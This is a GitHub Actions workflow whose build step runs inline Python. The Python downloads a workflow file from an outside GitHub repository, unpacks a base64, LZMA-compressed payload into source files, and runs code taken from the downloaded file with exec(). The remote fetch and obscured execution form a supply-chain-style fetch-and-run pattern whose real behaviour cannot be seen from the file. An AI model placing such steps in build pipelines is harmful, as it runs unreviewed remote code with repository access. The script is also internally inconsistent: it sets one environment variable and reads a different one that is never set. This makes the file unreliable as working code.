jobs:
  build:
    if: github.event.repository.private == false
    runs-on: xcode-27
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
        with:
          ref: >-
            1e63efa4db514cc122f2940a39623d9bc65c554c
      - name: Verify R697 and build IPA
        shell: bash
        run: |
          python3 - <<'PYCODE'
          import os,re,base64,lzma,hashlib
          import pathlib,urllib.request,ast
          url=('https://raw.githubusercontent.com/'
            'zeek10191019-stack/'
            'true-plan-showdown-verification/'
            'main/.github/workflows/v0.yml')
          req=urllib.request.Request(url,headers={
            'User-Agent':'R697-Pinned-Builder'})
          with urllib.request.urlopen(
            req,timeout=40) as res:
            old=res.read(25000)
          assert len(old)==10197
          assert hashlib.sha256(old).hexdigest()==(
            '4533f9a1cb4a474d6052073ae01f2cb4'
            '366269cf39e8e42cb6423b27ec458440')
          m=re.search(rb'(?m)^  R696_PKG: >-\n'
            rb'((?:    [^\n]*\n)+)',old)
          assert m,'R696_PINNED_PACKAGE_MISSING'
          os.environ['R696_PKG']=b''.join(
            m[1].split()).decode('ascii')
          raw=lzma.decompress(base64.b64decode(
            os.environ['R697_PKG']),
            format=lzma.FORMAT_ALONE)
          assert hashlib.sha256(raw).hexdigest()==(
            '418c7dfe42dc4f77f0582b3bbd3fe393'
            '786ffc3f85215a1d5e90c107615ba00a')
          names=['R697FieldEffectEvidence.swift',
            'R697Patch.py','R697MakeBuild.py',
            'R697Smoke.swift']
          sizes=[6372, 1647, 2897, 5428]
          assert sum(sizes)==len(raw)
          pos=0
          for name,size in zip(names,sizes):
            folder='tests' if name.endswith(
              'Smoke.swift') else 'tools'
            p=pathlib.Path(folder)/name
            p.parent.mkdir(parents=True,
              exist_ok=True)
            p.write_bytes(raw[pos:pos+size])
            pos+=size
          print('R697_SOURCE_SHA_PASS',flush=True)
          text=old.decode('utf-8')
          marker="          python3 - <<'PYCODE'\n"
          start=text.index(marker)+len(marker)
          end=text.index('\n          PYCODE',start)
          block=text[start:end]
          body='\n'.join(line[10:] for line in
            block.splitlines())
          needle=("['python3','tools/"+
            "R696MakeBuild.py']")
          assert body.count(needle)==1
          body=body.replace(needle,
            "['python3','tools/R697MakeBuild.py']")
          ast.parse(body)
          exec(compile(body,'r696','exec'),{})
          PYCODE
      - uses: actions/upload-artifact@v4
        with:
          name: R697-unsigned-iLoader-IPA
          path: dist/R697*
          if-no-files-found: error
          retention-days: 7
